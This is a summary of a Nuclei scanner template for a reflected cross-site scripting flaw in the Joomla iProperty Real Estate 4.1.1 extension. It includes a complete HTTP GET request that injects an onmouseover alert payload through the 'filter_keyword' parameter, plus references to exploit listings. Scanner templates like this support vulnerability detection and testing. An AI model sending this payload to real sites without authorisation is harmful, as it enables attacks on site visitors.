# Nuclei Template: Joomla iProperty Real Estate 4.1.1 - Cross-Site Scripting
**Template ID:** joomla-iproperty-xss
**Vulnerability Class:** Cross-site Scripting (XSS) - Generic
**Severity:** Medium
**Source:** Nuclei Template (`joomla-iproperty-real-estate-xss.yaml`)

## Vulnerability Information & PoC

## Description
Joomla extension iproperty is vulnerable to XSS in GET parameter 'filter_keyword'.

## Steps to reproduce / Exploit Payload
```http
GET {{BaseURL}}/iproperty/property-views/all-properties-with-map?filter_keyword=pihil%22onmouseover=%22alert(document.domain)%22style=%22position:absolute;width:100%;height:100%;top:0;left:0;%22f63m4&option=com_iproperty&view=allproperties&ipquicksearch=1
```

## References
- https://www.exploit-db.com/exploits/51640
- https://cxsecurity.com/issue/WLB-2023070076
- https://extensions.joomla.org/extension/vertical-markets/real-estate/iproperty/
